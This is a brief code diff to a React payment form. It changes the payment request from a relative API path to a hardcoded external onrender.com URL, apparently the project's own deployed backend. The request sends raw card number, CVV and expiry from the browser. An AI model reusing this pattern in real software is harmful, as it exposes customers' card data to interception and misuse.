@@ -15,7 +15,7 @@ export default function Payment() {
     setLoading(true);
     
     try {
-      const response = await axios.post('/api/payment', {
+      const response = await axios.post('https://electricjets.onrender.com/api/payment', {
         amount: form.amount,
         details: { cardNumber: form.cardNumber, cvv: form.cvv, expiry: form.expiry }
       });
